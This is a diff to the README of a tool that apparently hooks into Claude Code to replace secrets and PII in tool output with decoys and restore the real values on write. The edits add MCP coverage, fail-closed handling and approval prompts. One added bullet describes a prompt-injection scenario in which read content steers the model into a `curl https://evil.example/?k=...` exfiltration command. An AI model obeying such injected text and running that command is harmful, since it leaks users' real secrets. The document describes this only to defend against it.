@@ -55,7 +55,8 @@ as a way to keep court PII / client data out of transcripts.
 
 The guard covers both entry points: a `PreToolUse` deny on `Read` (blocks the file
 before its content is even produced), and a `PostToolUse` withhold on `Bash`/`Grep`
-output — so a shell read (`cat secrets.txt`) can't sneak the same content past it.
+and MCP-tool (`mcp__.*`) output — so a shell read (`cat secrets.txt`) or a database /
+CRM MCP server can't sneak the same content past it.
 When output is withheld, the model gets a short notice saying what was found and how
 to proceed (sanitize, or ask the user). Already-sanitized text is recognized by its
 reserved-range decoys (RFC 5737 IPs, `example.*` addresses, area-9xx SSNs) and does
@@ -65,7 +66,7 @@ keep.
 
 ### 3. Transparent auto-cloak (the magic — buildable, with sharp edges)
 
-`PostToolUse` sanitizes every `Read`/`Bash`/`Grep` result into decoys before the model
+`PostToolUse` sanitizes every `Read`/`Bash`/`Grep`/MCP-tool result into decoys before the model
 sees it; `PreToolUse` restores real values before a `Write`/`Edit` reaches disk. Claude
 does its whole job over decoys and never sees a real secret, while files on disk stay
 correct. Verified end-to-end: the model sees `203.0.113.183 / alex.chen@example.com`,
@@ -74,7 +75,7 @@ the file written to disk gets the real `10.9.9.9 / admin@bank.com`.
 ```jsonc
 // integrations/claude-code/settings.transparent.json
 { "hooks": {
-  "PostToolUse": [ { "matcher": "Read|Bash|Grep",
+  "PostToolUse": [ { "matcher": "Read|Bash|Grep|mcp__.*",
     "hooks": [ { "type": "command", "command": "cloak hook sanitize" } ] } ],
   "PreToolUse":  [ { "matcher": "Write|Edit",
     "hooks": [ { "type": "command", "command": "cloak hook restore" } ] } ] } }
@@ -100,6 +101,13 @@ Two things to know before turning this on:
   restore can't re-anchor it (the engine's `reverseGaps` flags this, but the edit may
   still be wrong). Scope the matcher to diagnostic flows; don't point transparent mode
   at a refactor of secret-bearing source.
+- Restoring into shell commands (add `|Bash` to the restore matcher, e.g. to `ssh` a
+  decoyed host) **always asks for your approval**, even under bypass permissions. A
+  command can send what it receives: content the model read could prompt-inject it into
+  `curl https://evil.example/?k=<decoy>`, and a silent restore would hand over the real
+  value. The prompt shows the restored command; the reason names value types only, never
+  values. In headless `claude -p` runs nobody can approve, so restored commands are
+  blocked there. Commands without decoys run as normal.
 
 Don't run profiles 2 and 3 together: the guard would deny the very reads the sanitizer
 wants to transform.
@@ -111,7 +119,8 @@ glue — the config just calls `cloak hook <mode>`. It reads the Claude Code hoo
 as JSON on stdin and writes a hook response on stdout:
 
 - `cloak hook guard` — PreToolUse. Scans `tool_input.file_path`; emits a `deny` if it
-  holds secrets, otherwise nothing (allow). Fail-open on error (it's a safety net).
+  holds secrets, otherwise nothing (allow). PostToolUse: withholds output that holds
+  secrets. **Fail-closed** on internal errors too: deny the read / withhold the output.
 - `cloak hook sanitize` — PostToolUse. Sanitizes the tool output, accumulates the
   session bridge, emits `updatedToolOutput`. **Fail-closed**: if it can't sanitize —
   including when the session env vars are missing — it withholds the text rather than
@@ -119,14 +128,24 @@ as JSON on stdin and writes a hook response on stdout:
 - `cloak hook restore` — PreToolUse. Restores decoys in `content` / `old_string` /
   `new_string` / `command` to real values, emits `updatedInput`. **Fail-closed**: if it
   can't restore — env missing, wrong passphrase — it *denies* the tool call rather than
-  persist decoy data into a real file (or run a command against a decoy host).
+  persist decoy data into a real file (or run a command against a decoy host). A
+  restored `command` returns `permissionDecision: "ask"` (see above); a call with no
+  decoys in it is a no-op.
 
-Two contract details worth knowing (verified against the Claude Code binary, v2.1.198):
+Every mode exits **2** (Claude Code's blocking error) on a malformed event or any error
+that escapes its own fail-closed path. Exit 1 would be non-blocking: the call would
+proceed and the output would reach the model.
+
+Contract details worth knowing (verified against the Claude Code binary, v2.1.198; the
+`ask` and MCP behavior re-verified end-to-end on v2.1.310):
 the PostToolUse payload field is **`tool_response`** (`tool_result` is accepted as a
 fallback for other harnesses), and Claude Code **validates `updatedToolOutput` against
 the tool's output schema** — so the adapter preserves the response's shape (Bash
 `{stdout, stderr, …}`, Read `{file: {content, …}}`) and transforms only the
-text-bearing fields, leaving paths and metadata untouched.
+text-bearing fields, leaving paths and metadata untouched. MCP results arrive as a
+content array (`[{type: "text", text}]`) and are rewritten in place the same way. An
+Edit's result is not shown to the model (`contentNotInModelContext`), so restored values
+written by an Edit don't flow back into context.
 
 ## Setup
 
